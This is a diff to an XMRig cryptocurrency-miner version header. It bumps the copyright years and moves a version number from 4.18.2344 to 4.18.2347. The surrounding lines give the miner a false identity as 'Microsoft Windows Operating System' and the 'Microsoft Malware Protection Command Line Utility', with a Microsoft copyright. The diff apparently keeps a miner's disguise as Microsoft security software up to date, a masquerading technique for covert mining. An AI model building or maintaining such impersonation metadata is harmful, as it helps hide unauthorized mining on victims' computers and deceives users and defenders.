@@ -1,6 +1,6 @@
 /* XMRig
- * Copyright (c) 2018-2024 SChernykh   <https://github.com/SChernykh>
- * Copyright (c) 2016-2024 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
+ * Copyright (c) 2018-2025 SChernykh   <https://github.com/SChernykh>
+ * Copyright (c) 2016-2025 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
  *
  *   This program is free software: you can redistribute it and/or modify
  *   it under the terms of the GNU General Public License as published by
@@ -22,7 +22,7 @@
 #define APP_ID        "Microsoft Windows Operating System"
 #define APP_NAME      "Microsoft Windows Operating System"
 #define APP_DESC      "Microsoft Malware Protection Command Line Utility"
-#define APP_VERSION   "4.18.2344"
+#define APP_VERSION   "4.18.2347"
 #define APP_DOMAIN    ""
 #define APP_SITE      ""
 #define APP_COPYRIGHT "(c) Microsoft Corporation. All rights reserved."
@@ -30,7 +30,7 @@
 
 #define APP_VER_MAJOR  4
 #define APP_VER_MINOR  18
-#define APP_VER_PATCH  2344
+#define APP_VER_PATCH  2347
 
 #ifndef NDEBUG
 #define BUILD_TYPE   "DEBUG"
